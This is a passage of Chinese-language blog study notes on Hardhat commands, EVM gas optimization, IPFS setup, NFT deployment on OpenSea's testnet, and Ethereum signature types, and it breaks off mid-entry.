<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npx hardhat <span class="built_in">test</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  Token contract</span><br><span class="line">    ✔ Deployment should assign the total supply of tokens to the owner (947ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  1 passing (958ms)</span><br></pre></td></tr></table></figure>
<h1>常用命令合集：</h1>
<p>记录一些hardhat框架的常用命令，后面方便复查。</p>
<h2 id="编译：">编译：</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn hardhat compile</span><br></pre></td></tr></table></figure>
<h2 id="部署">部署</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署在hardhat网络</span></span><br><span class="line">yarn hardhat deploy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署在配置文件对应的测试网</span></span><br><span class="line">yarn hardhat --network bsc_testnet deploy</span><br></pre></td></tr></table></figure>
<h2 id="测试：">测试：</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试整个<span class="built_in">test</span>文件夹里的script,hardhat环境</span></span><br><span class="line">yarn hardhat test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试整个<span class="built_in">test</span>文件夹里的script,指定测试网</span></span><br><span class="line">yarn hardhat --network bsc_testnet test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试单个script</span></span><br><span class="line">yarn hardhat --network bsc_testnet test test/transfer.ts</span><br></pre></td></tr></table></figure>
<h2 id="fork主网">fork主网:</h2>
<p><a href="https://chainlist.org/chain/56">chainlist</a>里找一个rpc链接<br />
hardhat.config.ts加上配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">networks</span>: &#123;</span><br><span class="line">        <span class="attr">hardhat</span>: &#123;</span><br><span class="line">            <span class="attr">mining</span>: &#123;</span><br><span class="line">                <span class="attr">auto</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">interval</span>: <span class="number">1000</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">forking</span>: &#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;https://bsc-mainnet.nodereal.io/v1/64a9df0874fb4a93b9d0a3849de012d3&quot;</span>,</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个命令会将当前最新的一个区块数据 fork 到本地，也就是说现在本地 node 链中存在的就是这个区块的数据。</span></span><br><span class="line">npx hardhat node --fork https://bsc-mainnet.nodereal.io/v1/64a9df0874fb4a93b9d0a3849de012d3 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以指定区块号进行 fork</span></span><br><span class="line">npx hardhat node --fork https://bsc-mainnet.nodereal.io/v1/64a9df0874fb4a93b9d0a3849de012d3 --fork-block-number 19906400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单元测试在本地 node 中执行，需要指定网络localhost</span></span><br><span class="line">yarn hardhat --network localhost test test/PancakeSyrupPoolStrategy.test.ts</span><br></pre></td></tr></table></figure>
<h2 id="验证合约源码：">验证合约源码：</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">example:合约源代码、部署网络、合约的地址</span></span><br><span class="line">yarn hardhat verify --contract contracts/JToken.sol:JToken --network bsc_testnet 0x582cA468bcE2a68D1147D5411814256E52590103</span><br></pre></td></tr></table></figure>
<h1>Summary:</h1>
<p>构建一个hardhat项目，一般需要以下几个步骤</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>环境安装</p>
</li>
<li class="lvl-2">
<p>创建hardhat项目</p>
</li>
<li class="lvl-2">
<p>智能合约编写和编译 compile</p>
</li>
<li class="lvl-2">
<p>编写部署脚本 deploy</p>
</li>
<li class="lvl-2">
<p>验证合约源码</p>
</li>
<li class="lvl-2">
<p>编写测试脚本 test</p>
</li>
</ul>
<h1>Inspire：</h1>
<p>search或构建一个适合某类项目的hardhat脚手架，就不用每次都一步步setup了。</p>
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/2354">hardhat 教程及 hardhat-deploy 插件使用</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/weixin_43405220/article/details/122256055">使用Hardhat验证 Solidity 源码 （Ethereum or BSC）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://mirror.xyz/xyyme.eth/Z2qjTJJtaQHcwLc-9yHOGpXbeE7RHGdm5EafGjq7qhw">Hardhat fork 简明使用教程</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Hitchhikers_Guide_to_the_EVM</title>
    <url>/2022/46265.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.youtube.com/watch?v=zgukojxyHKc">Alex Roan: Hitchhiker’s Guide to the EVM</a> 学习记录</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707095117.png" alt="20220707095117" /></p>
<p>有很多主题想讨论，但有一个最重要的概念：</p>
<h1>Gas Golfing</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707095719.png" alt="20220707095719" /></p>
<p>gas golfing is the process of optimizing the existing functionality of your contract to to do the same things to be able to perform the same functions but just cheaper and more efficiently</p>
<p>高尔夫最终目的就是想打进球洞，过程中需要不断优化去减少杆数<br />
gas优化也是一样，一个函数同样的功能怎么才能更便宜这里特指，优化对<code>storage</code>的使用</p>
<h1>What is Storage in Solidity?</h1>
<h2 id="定义-3">定义:</h2>
<p>storage is data that is persistent between transactions it’s stored in a contract for extended periods of time and it can be accessed and changed in future transactions</p>
<h2 id="例子-2">例子:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707100134.png" alt="20220707100134" /></p>
<p>图中有个storage 变量，在其他编程语言中可能被称为<code>instance variables</code>或<code>class variables</code></p>
<p>but in solidity there is a catch so it is one of the most <code>gas-intensive</code> things that a contract can play around with accessing it changing it is disproportionately expensive in comparison with what we associate with normal disk storage</p>
<p>不同之处在于，在别的编程语言中，持久化存储变量可能只是占用硬盘空间，但在solidity中持久化存储变量，在读写这类变量的数据都跟钱有很大关系。</p>
<h1>Why is Storage Expensive？</h1>
<h2 id="中心化世界：">中心化世界：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707100745.png" alt="20220707100745" /></p>
<p>在中心化的世界中，持久化存储的特点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>单个硬盘</p>
</li>
<li class="lvl-2">
<p>总成本低</p>
</li>
<li class="lvl-2">
<p>易扩容</p>
</li>
</ul>
<h2 id="去中心化世界：">去中心化世界：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707101232.png" alt="20220707101232" /></p>
<p>换到去中心化的世界中，存储不再是存在一个服务器的一个硬盘里，而是存在整个网络里的每一块硬盘上。<br />
Evm里有两个很贵的<code>op code</code>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>SSTORE</code>: store this piece of data in this storage slot</p>
</li>
<li class="lvl-2">
<p><code>SLOAD</code>: read this data from this specific slot any time that we set a storage variable in a function somewhere</p>
</li>
</ul>
<h1>省gas的五个方法：</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707101850.png" alt="20220707101850" /></p>
<h2 id="非必要的话，不存Storage">非必要的话，不存Storage:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707102201.png" alt="20220707102201" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707102425.png" alt="20220707102425" /></p>
<p>一般情况下，合约都不会再次使用这部分数据（转账记录），所以用<code>event</code>代替<code>Storage</code>。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707102454.png" alt="20220707102454" /></p>
<p>对于gas的影响:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707102925.png" alt="20220707102925" /></p>
<h2 id="尽量用constant或immutable">尽量用constant或immutable:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707104558.png" alt="20220707104558" /></p>
<p>有不变量就尽量用<code>constant</code>或<code>immutable</code>用关键字<code>constant</code>或<code>immutable</code>会影响opcode <code>slot</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>constant：constant value must be hard coded into the declaration rather than set in the constructor</p>
</li>
<li class="lvl-2">
<p>immutable：set it in the constructor but as soon as that constructor is finished that value that we set for link can never change again只能仅仅一次在构造函数中设置值</p>
</li>
</ul>
<p>区别在于初始化赋值的位置不一样。</p>
<h3 id="gas影响">gas影响:</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220707105356.png" alt="20220707105356" /></p>
<p>用了不变量关键词后，读取一次数据对gas的影响。如果经常会读取到该变量，那么累计下来会节省很多gas</p>
<h3 id="自己测试">自己测试:</h3>
<h4 id="部署：">部署：</h4>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// constant1.sol</span></span><br><span class="line">pragma solidity ^ <span class="number">0.8</span><span class="number">.11</span>;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public <span class="variable constant_">LINK</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddr</span>) &#123;</span><br><span class="line">        <span class="variable constant_">LINK</span> = tokenAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>耗费gas:133322</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// constant2.sol</span></span><br><span class="line">pragma solidity ^ <span class="number">0.8</span><span class="number">.11</span>;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public constant <span class="variable constant_">LINK</span> = <span class="number">0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>耗费gas:104187</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// constant3.sol</span></span><br><span class="line">pragma solidity ^ <span class="number">0.8</span><span class="number">.11</span>;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public immutable <span class="variable constant_">LINK</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddr</span>) &#123;</span><br><span class="line">        <span class="variable constant_">LINK</span> = tokenAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>耗费gas:110824</p>
<h4 id="读取">读取:</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>constant1.sol</code>:耗费gas 23553</p>
</li>
<li class="lvl-2">
<p><code>constant2.sol</code>:耗费gas 21420</p>
</li>
</ul>
<h2 id="明确表示Storage-Variable">明确表示Storage Variable:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710093400.png" alt="20220710093400" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710093440.png" alt="20220710093440" /></p>
<p>后面写函数的时候，提醒自己在操作的是Storage的变量，会比较耗费gas</p>
<h2 id="不要频繁读写：">不要频繁读写：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710093801.png" alt="20220710093801" /></p>
<p>状态变量在循环、多条件判断的时候，注意观察接触<code>touch</code>状态变量的次数，读写超过两次(<code>Slod</code>+<code>SStore</code>)</p>
<p>做法：先把状态变量加载到内存里的临时变量，再去频繁读写</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710094037.png" alt="20220710094037" /></p>
<p>提及了EIP-2929里的<code>Cold and Warm</code>的概念：读过的slot后，状态:<code>cold</code>-&gt;<code>warm</code>,下次读写会更便宜。<br />
<a href="https://medium.com/taipei-ethereum-meetup/eip2929-eip2930-%E7%B0%A1%E4%BB%8B-14a8b580a141">EIP2929, EIP2930 簡介</a></p>
<blockquote>
<p>在实作层，EVM会维系一个本笔交易读取过所有交易的Set。每次有尚未读取过的slot时，就会先收取一笔CLOD_SLOAD_COST (2100)，然后把这个slot加入这个set中，下次读写就会比较便宜。</p>
<p>对于已经读取过的Slot，再次写入的OpcodeSSTORE之gas cost为会降低为<br />
<code>5000 — COLD_SLOAD_COST (2100) = 2900</code></p>
<p>简单的说，单纯只操作一次<code>SSTORE</code>的总gas 会维持一样在5000 。但如果这个slot是之前有读过的，则写入的gas cost就会降低。近一步来说，一个x += 100，其实会变得更便宜:</p>
<p>Pre-EIP-2929: <code>800 SLOAD + 5000 SSTORE = 5800</code><br />
Post-EIP-2929: <code>2100 SLOAD + 2900 warm SSTORE = 5000</code></p>
</blockquote>
<h3 id="gas影响；">gas影响；</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710095126.png" alt="20220710095126" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>warm slot</code>还是不如在内存里读取便宜</p>
</li>
<li class="lvl-2">
<p>可能每次仅省了一丢丢<code>gas</code>,成千上万的<code>tx</code>就会显现出<code>gas优化</code>的好处</p>
</li>
</ul>
<h2 id="Pack-Your-Struct-打包结构体：">Pack Your Struct 打包结构体：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710095620.png" alt="20220710095620" /></p>
<p>在EVM中，32是一个重要的数字，要记住！</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710095827.png" alt="20220710095827" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710100155.png" alt="20220710100155" /></p>
<p>评估一下第二个变量，如果存的内容较小，就可以定义长度小一点的。然后evm就会把两个变量压缩在slot1里面。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710102044.png" alt="20220710102044" /></p>
<p>squeezes  挤挤总会有的</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710103109.png" alt="20220710103109" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710141301.png" alt="20220710141301" /></p>
<p>对变量适当的排序、选择适当的size，可以减少slot的使用</p>
<blockquote>
<p>不知道有没类似的工具可以提示优化的</p>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.youtube.com/watch?v=zgukojxyHKc">Alex Roan: Hitchhiker’s Guide to the EVM</a></p>
</li>
<li class="lvl-2">
<p><a href="https://downsub.com/">导出youtube字幕,然后再用Chrome打开</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-IPFS使用入门</title>
    <url>/2022/11380.html</url>
    <content><![CDATA[<h1>安装：</h1>
<p><a href="https://dist.ipfs.tech/#go-ipfs">下载链接</a></p>
<p>Linux 平台下，使用以下命令进行安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar xvfz kubo_v0.17.0_linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> kubo</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<h1>初始化:</h1>
<p>安装完成之后，要使用IPFS第一步是要对IPFS进行初始化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost kubo]<span class="comment"># ipfs init</span></span><br><span class="line">generating ED25519 keypair...done</span><br><span class="line">peer identity: 12D3KooWCmmHYHQSZ2woV7euLdFenHDj1g6PtmkQpzTJYGtZM9mo</span><br><span class="line">initializing IPFS node at /root/.ipfs</span><br><span class="line">to get started, enter:</span><br><span class="line"></span><br><span class="line">        ipfs <span class="built_in">cat</span> /ipfs/QmQPeNsJPyVWPFDVHb77w8G42Fvo15z4bG2X8D2GhfbSXc/readme</span><br></pre></td></tr></table></figure>
<h1>配置修改:</h1>
<p>修改配置文件:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.ipfs/config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改为内网IP</span></span><br><span class="line"><span class="string">&quot;Addresses&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;API&quot;</span>: <span class="string">&quot;/ip4/192.168.2.23/tcp/5001&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Announce&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;AppendAnnounce&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Gateway&quot;</span>: <span class="string">&quot;/ip4/192.168.2.23/tcp/8080&quot;</span>,</span><br></pre></td></tr></table></figure>
<p>允许跨域:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ipfs config --json API.HTTPHeaders.Access-Control-Allow-Origin &#x27;[&quot;http://192.168.2.23:5001&quot;, &quot;http://localhost:3000&quot;, &quot;http://127.0.0.1:5001&quot;, &quot;https://webui.ipfs.io&quot;]&#x27;</span></span><br><span class="line">[root@localhost ~]<span class="comment"># ipfs config --json API.HTTPHeaders.Access-Control-Allow-Methods &#x27;[&quot;PUT&quot;, &quot;POST&quot;]&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>上传文件:</h1>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="string">&quot;HelloWorld&quot;</span> &gt;&gt; upchain.pro.txt</span><br></pre></td></tr></table></figure>
<p>ipfs 使用add 命令来添加内容到节点中，</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ipfs add upchain.pro.txt</span></span><br><span class="line">added QmfJs3ZYScPctKNfbYDYbkHX6akxgshtn6cPSEj9prqdQz upchain.pro.txt</span><br><span class="line">11 B / 11 B [==============================================================================================================================] 100.00%</span><br></pre></td></tr></table></figure>
<p>当它文件添加到节点时，会为文件生成唯一的hash:<code>QmfJs3ZYScPctKNfbYDYbkHX6akxgshtn6cPSEj9prqdQz</code>, 可以使用<code>ipfs cat</code>查看文件的内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ipfs cat QmfJs3ZYScPctKNfbYDYbkHX6akxgshtn6cPSEj9prqdQz</span></span><br><span class="line">HelloWorld</span><br></pre></td></tr></table></figure>
<h1>开启服务:</h1>
<p>此时文件仅仅是上传在本地的IPFS节点中，如果需要把文件同步到网络，就需要开启 daemon 服务， 使用命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ipfs daemon</span></span><br><span class="line">Initializing daemon...</span><br><span class="line">Kubo version: 0.17.0</span><br><span class="line">Repo version: 12</span><br><span class="line">System version: amd64/linux</span><br><span class="line">Golang version: go1.19.1</span><br><span class="line">2022/11/25 01:12:55 failed to sufficiently increase receive buffer size (was: 208 kiB, wanted: 2048 kiB, got: 416 kiB). See https://github.com/lucas-clemente/quic-go/wiki/UDP-Receive-Buffer-Size <span class="keyword">for</span> details.</span><br><span class="line">Swarm listening on /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm listening on /ip4/127.0.0.1/udp/4001/quic</span><br><span class="line">Swarm listening on /ip4/192.168.122.1/tcp/4001</span><br><span class="line">Swarm listening on /ip4/192.168.122.1/udp/4001/quic</span><br><span class="line">Swarm listening on /ip4/192.168.2.23/tcp/4001</span><br><span class="line">Swarm listening on /ip4/192.168.2.23/udp/4001/quic</span><br><span class="line">Swarm listening on /ip6/::1/tcp/4001</span><br><span class="line">Swarm listening on /ip6/::1/udp/4001/quic</span><br><span class="line">Swarm listening on /p2p-circuit</span><br><span class="line">Swarm announcing /ip4/127.0.0.1/tcp/4001</span><br><span class="line">Swarm announcing /ip4/127.0.0.1/udp/4001/quic</span><br><span class="line">Swarm announcing /ip4/192.168.2.23/tcp/4001</span><br><span class="line">Swarm announcing /ip4/192.168.2.23/udp/4001/quic</span><br><span class="line">Swarm announcing /ip6/::1/tcp/4001</span><br><span class="line">Swarm announcing /ip6/::1/udp/4001/quic</span><br><span class="line">API server listening on /ip4/192.168.2.23/tcp/5001</span><br><span class="line">WebUI: http://192.168.2.23:5001/webui</span><br><span class="line">Gateway (<span class="built_in">readonly</span>) server listening on /ip4/192.168.2.23/tcp/8080</span><br><span class="line">Daemon is ready</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/2018/12/25/use-ipfs">IPFS 使用入门</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-OpenSea制作NFT初步使用</title>
    <url>/2022/32598.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>OpenSea制作NFT初步使用</p>
<h1>部署ERC721合约：</h1>
<p><a href="https://gist.github.com/jerrychan807/1d59896d43ed8f4b3d918388bc4eb459">KILLAz.sol源代码</a></p>
<p>将<code>KILLAz.sol</code>通过remix部署到<code>rinkeby</code>测试网上部署时，填入<code>_reserveAddress</code>网页售卖收款地址。在rinkeby上验证合约源码，方便后面修改合约的一些变量</p>
<h1>上传图片及NFT元数据文件：</h1>
<p>我这里暂用自己的github public仓库作为存储的地方</p>
<p>原项目<code>KILLAz</code>的元数据文件：<code>https://gateway.pinata.cloud/ipfs/QmeLBX1hPFeZTk61rtJAxdrjFdTttR7D6Q9XFuXU5fSoEQ/1</code></p>
<p>copy原项目的数据，新建txt文档，文档中存储构造符合OpenSea标准的NFT 元数据（元数据中保存了图片的url），如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.txt</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Background&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;Beige&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Body&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;Ancient One&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Weapon&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;Katana&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Clothing&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Mask&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Primary Accessory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;Spirit Necklace&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Secondary Accessory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;KILLAz #1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;image&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://raw.githubusercontent.com/jerrychan807/imggg/master/721/1.jpg&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622190753.png" alt="20220622190753" /></p>
<h1>合约初始化设置：</h1>
<h2 id="打开售卖开关：">打开售卖开关：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622191550.png" alt="20220622191550" /></p>
<h2 id="设置baseUri">设置baseUri:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622191719.png" alt="20220622191719" /></p>
<h2 id="铸造nft：">铸造nft：</h2>
<p>铸造3个，单价0.029，总价0.087</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622192005.png" alt="20220622192005" /></p>
<h1>导入opensea：</h1>
<p>导入opensea，查看我们发布的NFT，拷贝合约地址到<code>https://testnets.opensea.io/get-listed/step-two</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622192229.png" alt="20220622192229" /></p>
<p>发布成功：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622192313.png" alt="20220622192313" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622192333.png" alt="20220622192333" /></p>
<h1>Bug:</h1>
<p>元数据文件和图片地址要在导入opensea之前检查好，不然导入后再修改会没有效果。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220622193055.png" alt="20220622193055" /></p>
<p>基于合约发的nft可以很轻松的做到批量的效果。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/JAVA_HHHH/article/details/120348901#comments_20646978">使用以太坊在OpenSea制作NFT完整版</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Solidity_personal_sign</title>
    <url>/2022/1085.html</url>
    <content><![CDATA[<h1>数字签名算法:</h1>
<p>以太坊使用的数字签名算法叫双椭圆曲线数字签名算法（ECDSA），基于双椭圆曲线“私钥-公钥”对的数字签名算法。它主要起到了三个作用：</p>
<ul class="lvl-0">
<li class="lvl-2"><code>身份认证</code>：证明签名方是私钥的持有人</li>
<li class="lvl-2"><code>不可否认</code>：发送方不能否认发送过这个消息</li>
<li class="lvl-2"><code>完整性</code>：消息在传输过程中无法被修改</li>
</ul>
<h2 id="流程-2">流程:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>签名即<code>正向算法（消息 + 私钥 + 随机数）= 签名</code>，其中消息是公开的，私钥是隐私的，经过ECDSA正向算法可得到<code>签名，即r、s、v</code></p>
</li>
<li class="lvl-2">
<p>验证即<code>反向算法（消息 + 签名）= 公钥</code>，其中消息是公开的，签名是公开的，经过ECDSA反向算法可得到公钥，然后对比已公开的公钥</p>
</li>
</ul>
<h2 id="签名交易">签名交易:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221116112417.png" alt="20221116112417" /></p>
<h2 id="签名的类型">签名的类型:</h2>
<p><code>eth_sign</code> 是用来签署任意数据。这使得它是最强大的，最简单的（只是签署数据），但也是最危险的。<br />
这里的问题是，你可以让用户签署一个数据，而这个实际上是交易数据。想象一下，你让用户登录到你的服务，但你让他们签署的数据实际上是一个交易，如 “发送5个ETH给攻击者”。<br />
交易毕竟只是由字节组成，人们很可能不会检查他们所签署的这串字符的实际含义。看似无害的签名，却成了窃取资金的攻击。所以一般不鼓励直接使用<code>eth_sign</code>。</p>
<p><code>personal_sign</code> 后来加入来解决这个问题。该方法在任何签名数据前加上<code>&quot;\x19Ethereum Signed Message:\n&quot;</code>，这意味着如果有人要签署交易数据，添加的前缀字符串会使其成为无效交易。</p>
<p>对于更复杂的用例，特别是在智能合约中使用时，EIP-712标准被创建。EIP-712标准随着时间的推移而有所改变，但目前MetaMask支持的最后一个版本是<code>signTypedData_v4</code>。或者你可以使用一个特定的库，如eip-712。</p>
<p>EIP-712解决的主要问题是确保用户清楚地知道他们在签署什么，为哪个合约地址和网络签署，而且每个签名最多只能使用一次。简而言之，这是通过签署所有需要的配置数据（地址、chain id、版本、数据类型）的哈希值+实际数据本身来实现的。ERC20-Permit 是一个关于如何使用signTypedData_v4的好例子。</p>
<h2 id="实例">实例:</h2>
<p>新地址刚登录opensea时，就会弹出签名。下图是小狐狸（metamask）钱包进行签名时弹出的窗口，它可以证明你拥有私钥的同时不需要对外公布私钥。</p>
